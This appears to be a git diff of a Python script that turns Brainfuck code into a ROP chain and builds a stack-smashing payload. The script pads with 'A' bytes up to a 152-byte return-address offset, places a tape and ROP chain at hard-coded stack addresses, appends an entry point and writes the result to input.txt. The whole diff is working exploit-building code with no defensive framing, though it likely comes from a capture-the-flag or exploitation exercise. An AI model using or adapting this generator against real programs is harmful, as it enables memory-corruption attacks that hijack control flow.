@@ -1,26 +1,31 @@
+from mimetypes import init
 from bf_parser.bf_parser import *
 
-p = BF_Parser(",+>,+>,+.<.<.")
+# calculate offsets and constants
 
-offset = b"A" * 24 # offset until stack smash ; added for debugging
-tape = b"\x00" * 1024 # the brainfuck tape
+ra_offset = 152
+payload_max_size = 1000000
+tape_size = 30000
 
-payload_len = p.get_payload_len()
-sp_addr = 0x3ffffff000
-pointer_start = sp_addr + len(offset) + payload_len + 512 # the middle of the tape
+initial_sp = 0x3fffffef80
+tape_start = initial_sp - payload_max_size
+rop_chain_start = tape_start + tape_size
 
-payload = offset + p.parse(pointer_start, sp_addr) + tape
+# parse the brainfuck code
 
-num_bytes = len(payload)
+bf_code = input("Paste the Brainfuck code to compile:\n")
 
-print(f"The payload has {num_bytes} bytes and can be found in the input.txt file")
-# print(payload_len)
-# print(pointer_start)
-# print(payload)
+p = BF_Parser(bf_code)
 
-print("----------------debug info------------------")
-print(f"calculated len: {payload_len} ... actual len: {len(p.parse(pointer_start, sp_addr))}")
-print(f"pointer start: {hex(pointer_start)} \ninital sp address: {hex(sp_addr)}")
+rop_chain = p.parse(tape_start + tape_size // 2, rop_chain_start)
+entry_point = p.get_entry_point()
+offset = b"A" * (payload_max_size - tape_size - len(rop_chain) + ra_offset)
+tape = b"\x00" * tape_size
+
+payload = tape + rop_chain + offset + entry_point
+
+print(f"The payload has {len(payload)} bytes and can be found in the input.txt file")
+print(f"The rop_chain itself has {len(rop_chain)} bytes")
 
 with open("input.txt", "wb") as fout:
     fout.write(payload)
